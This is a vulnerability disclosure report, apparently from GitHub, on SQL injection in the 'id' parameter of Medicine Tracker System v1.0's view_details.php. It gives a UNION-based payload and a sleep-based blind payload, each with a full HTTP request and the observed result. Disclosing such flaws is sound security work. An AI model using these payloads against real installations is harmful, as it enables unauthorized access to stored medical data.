# Medicine Tracker System v1.0 has SQL injection

BUG_Author:godgua

Website source address:https://www.sourcecodester.com/php/16308/medicine-tracker-system-php-oop-and-mysql-db-source-code-free-download.html

Vulnerability File: /php-mts/app/medicines/view_details.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1' union all select null,null,null,concat(0x51525354,0x41424344,0x61626364),null,null-- -

```
GET /php-mts/app/medicines/view_details.php?id=-1%27%20union%20all%20select%20null,null,null,concat(0x51525354,0x41424344,0x61626364),null,null--%20- HTTP/1.1
Host: 192.168.0.100
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=t194o00fbqgbautftistta6ap2
Connection: close
```

union query success

![image](https://github.com/GodGua/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 2 from (select(sleep(15)))a) AND 'c'='c

```
GET /php-mts/app/medicines/view_details.php?id=1%27%20and%20(select%202%20from%20(select(sleep(15)))a)%20AND%20%27c%27=%27c HTTP/1.1
Host: 192.168.0.100
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=t194o00fbqgbautftistta6ap2
Connection: close
```

The server's response time is 15 seconds

![image](https://github.com/GodGua/bug_report/blob/main/sql1.png)
